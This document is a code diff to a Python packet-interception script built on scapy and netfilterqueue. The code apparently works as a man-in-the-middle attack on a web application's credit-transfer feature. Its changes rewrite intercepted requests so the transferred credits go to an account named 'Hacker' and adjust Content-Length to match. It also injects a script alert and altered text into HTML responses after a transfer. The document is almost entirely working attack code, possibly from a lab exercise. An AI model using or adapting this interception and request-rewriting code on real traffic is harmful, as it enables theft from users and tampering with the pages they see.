@@ -2,6 +2,7 @@ from scapy.all import *
 from colorama import init, Fore
 import netfilterqueue
 import re
+from bs4 import BeautifulSoup
 
 # initialize colorama
 init()
@@ -27,15 +28,16 @@ def process_packet(packet):
                 # forward the packet exit the function
                 packet.accept()
                 return
+     
             # remove Accept-Encoding header from the HTTP request
             new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
+          
             if '&credits=' in new_load:
             	split = new_load.split('username=')
             	victim = 'username='+split[1]
             	credits = split[1].split('credits=')[1]
             	replacement = 'username=Hacker&credits=' + credits
             	difference = len(replacement) - len(victim)
-            	print(victim)
             	new_load = re.sub(victim, replacement, new_load)
             	if "Content-Length" in load:
             		content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
@@ -57,8 +59,15 @@ def process_packet(packet):
             except:
                 packet.accept()
                 return
-            added_text = "<script>alert('You have been hacked');</script>"
-            added_text_length = len(added_text)
+            new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
+            added_text = ''
+            if "Your gift has been sent!" in new_load:
+            	added_text = "<script>alert('You have been hacked');</script>"
+            	load = re.sub('Transfer Credits to another user','You have been hacked ;)', new_load)
+            if added_text != '':
+            	added_text_length = len(added_text)
+            else:
+            	added_text_length = 0
             load = load.replace("</body>", added_text + "</body>")
             if "Content-Length" in load:
             	content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
